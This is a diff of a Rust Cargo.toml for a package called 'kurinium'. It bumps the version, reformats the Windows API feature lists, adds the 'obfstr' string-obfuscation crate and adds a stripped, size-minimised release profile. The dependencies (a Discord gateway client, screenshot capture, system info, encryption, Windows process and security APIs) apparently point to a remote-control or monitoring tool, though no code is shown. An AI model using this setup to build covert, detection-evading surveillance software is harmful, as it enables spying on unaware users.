@@ -1,12 +1,24 @@
 [package]
 name = "kurinium"
-version = "0.2.6"
+version = "0.2.9"
 edition = "2021"
 
 [target.'cfg(target_os = "windows")'.dependencies]
-winapi = { version = "0.3", features = ["winbase", "wincon", "winuser", "processthreadsapi", "handleapi", "winnt", "securitybaseapi", "winspool"] }
+winapi = { version = "0.3", features = [
+    "winbase",
+    "wincon",
+    "winuser",
+    "processthreadsapi",
+    "handleapi",
+    "winnt",
+    "securitybaseapi",
+    "winspool",
+] }
 windows-volume-control = "0.1"
-windows = { version = "0.59", features = ["Win32_Foundation", "Win32_UI_WindowsAndMessaging"] }
+windows = { version = "0.59", features = [
+    "Win32_Foundation",
+    "Win32_UI_WindowsAndMessaging",
+] }
 
 [dependencies]
 twilight-gateway = "0.16"
@@ -27,6 +39,7 @@ anyhow = "1.0"
 aes-gcm = "0.10"
 rand = "0.8.5"
 base64 = "0.22.1"
+obfstr = "0.4"
 hex = "0.4"
 sysinfo = "0.29.0"
 screenshots = "0.5.0"
@@ -47,3 +60,24 @@ lazy_static = "1.5.0"
 [build-dependencies]
 winres = "0.1"
 anyhow = "1.0"
+
+# Smaller size profile ----------
+[profile.release]
+opt-level = "z"
+lto = true
+codegen-units = 1
+strip = true
+panic = "abort"
+overflow-checks = false
+debug = false
+debug-assertions = false
+incremental = false
+rpath = false
+
+# Speed size profile ----------
+# [profile.release]
+# opt-level = 3
+# lto = "thin"
+# codegen-units = 16
+# strip = true
+# panic = "abort"
